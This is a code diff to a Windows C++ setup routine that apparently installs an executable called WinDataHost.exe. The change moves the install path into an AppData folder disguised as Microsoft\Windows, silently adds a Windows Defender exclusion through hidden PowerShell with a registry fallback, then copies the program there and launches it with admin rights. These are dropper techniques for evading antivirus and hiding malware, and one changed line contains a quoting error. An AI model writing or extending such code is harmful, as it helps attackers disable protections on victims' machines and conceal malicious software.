@@ -96,10 +96,16 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
     }
     LogMessage(L"Found source: " + sourcePath);
 
-    std::wstring targetDir = L"C:\\Program Files\\WinDataHost";
+    wchar_t appDataPath[MAX_PATH];
+    if (FAILED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
+        LogMessage(L"Error: Could not find AppData folder.");
+        return 0;
+    }
+
+    fs::path targetDir = fs::path(appDataPath) / L"Microsoft" / L"Windows";
     if (!fs::exists(targetDir)) {
         if (fs::create_directories(targetDir)) {
-            LogMessage(L"Created target directory: " + targetDir);
+            LogMessage(L"Created target directory: " + targetDir.wstring());
         } else {
             LogMessage(L"Error: Could not create target directory.");
             return 0;
@@ -110,13 +116,13 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
 
     LogMessage(L"Setting Windows Defender exclusion...");
     // Try with -ExecutionPolicy Bypass and explicit WindowStyle to ensure it runs
-    std::wstring psCmd = L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '" + targetDir + L"' -ErrorAction Stop\"";
+    std::wstring psCmd = L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '" + targetDir.wstring() + L"' -ErrorAction Stop\"";
     if (RunHiddenCommand(psCmd)) {
         LogMessage(L"Defender exclusion set successfully.");
     } else {
         LogMessage(L"Trying alternative exclusion method...");
         // Alternative via Registry (needs Admin)
-        std::wstring regCmd = L"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + targetDir + L"\" /t REG_DWORD /d 0 /f";
+        std::wstring regCmd = L"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + targetDir.wstring() + L\" /t REG_DWORD /d 0 /f";
         if (RunHiddenCommand(regCmd)) {
             LogMessage(L"Defender exclusion set via Registry.");
         } else {
@@ -124,10 +130,10 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
         }
     }
 
-    std::wstring targetPath = targetDir + L"\\" + exeName;
+    fs::path targetPath = targetDir / exeName;
     try {
         fs::copy_file(sourcePath, targetPath, fs::copy_options::overwrite_existing);
-        LogMessage(L"Copied file to: " + targetPath);
+        LogMessage(L"Copied file to: " + targetPath.wstring());
     } catch (const fs::filesystem_error& e) {
         std::string err = e.what();
         LogMessage(L"Error: Could not copy file. " + std::wstring(err.begin(), err.end()));
@@ -136,7 +142,7 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
 
     LogMessage(L"Starting WinDataHost.exe as Admin...");
     // Use "runas" to ensure it starts with admin rights
-    ShellExecute(NULL, L"runas", targetPath.c_str(), NULL, targetDir.c_str(), SW_SHOW);
+    ShellExecute(NULL, L"runas", targetPath.wstring().c_str(), NULL, targetDir.wstring().c_str(), SW_SHOW);
 
     LogMessage(L"Setup completed successfully.");
     return 0;
